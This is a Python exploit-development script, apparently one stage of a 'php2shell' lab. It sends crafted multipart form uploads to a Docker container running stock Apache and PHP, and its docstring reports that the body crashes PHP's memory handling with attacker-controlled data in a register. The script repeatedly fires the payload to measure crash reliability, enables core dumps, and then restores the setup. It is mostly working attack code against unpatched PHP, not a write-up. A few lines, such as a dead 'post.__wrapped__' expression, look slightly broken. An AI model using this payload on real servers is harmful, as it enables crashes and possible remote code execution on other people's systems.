#!/usr/bin/env python3
"""oom66: DETERMINISM of the stock crash (k1=3400, lim=8M).

oom65: stock crash PROVEN (zend_array_destroy+539, rdi=0x4b4b4b4b...=
our 'K' filler). 3/4 fires crashed; rep1 returned 200. Question: what
governs crash vs survive? Worker identity? Layout entropy?

Plan: 12 fires, same body (k1=3400). Per fire: status (broken-pipe=crash
mid-upload vs 200=survived), child pid before/after (prefork recycled?),
segv delta, cores. Then: 5 benign requests; then 6 more fires across
restart. Output: crash-rate table + survivor fingerprint.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
K1 = 3400
PREP = 3
POISON_PAGES = 40
CELLS = 10237


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(stamp_base):
    ps = [key_part(i) for i in range(K1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i) for i in range(K1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200", r.read(200).decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code, e.read(200).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:60]


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def pids():
    return sh("pgrep -f apache2 | tr '\\n' ',' ; pgrep -f 'apache2' | wc -l", 10)


def segv_of(logs):
    return len(re.findall(r"exit signal Segmentation", logs))


def fire(i, att, base_segv):
    before = pids()
    code, body = post(att)
    time.sleep(2)
    s = segv_of(full_logs())
    cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
    after = pids()
    crashed = (s > base_segv) or code in ("URLError", "HTTPError") and "Broken pipe" in body
    print("  f%02d: %-9s segv+=%d cores=%s crashed=%s pids %s -> %s"
          % (i, code, s - base_segv, cores, crashed, before.split(",")[:3], after.split(",")[:3]), flush=True)
    return s, crashed


def main():
    print("=== [0] stock + lim=8M ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    if md5 != STOCK_MD5:
        print("[ABORT] md5=%s" % md5, flush=True)
        return
    ini = "memory_limit=8M\nmax_input_vars=100000\npost_max_size=4096M\n"
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=8M" in probe:
            break
    print("[ini]", probe, flush=True)

    att = build_attack(9000000)
    base = segv_of(full_logs())
    crashes = 0
    N = 12
    print("=== [1] 12 fires, same run ===", flush=True)
    for i in range(N):
        base, crashed = fire(i, att, base)
        crashes += crashed

    print("=== [2] 5 benign ===", flush=True)
    oks = 0
    for _ in range(5):
        code, _ = post.__wrapped__(LAB) if False else (None, None)
        try:
            r = urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=8)
            r.read()
            oks += 1
        except Exception:
            pass
    print("  benign %d/5, segv+=%d" % (oks, segv_of(full_logs()) - base), flush=True)

    print("=== [3] restart + 6 fires ===", flush=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        try:
            urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=5).read()
        except Exception:
            pass
    for i in range(6):
        base, crashed = fire(20 + i, att, base)
        crashes += crashed

    print("=== RESULT: %d/%d fires crashed stock ===" % (crashes, N + 6), flush=True)

    print("=== [4] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        try:
            urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=5).read()
        except Exception:
            pass
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)


if __name__ == "__main__":
    main()
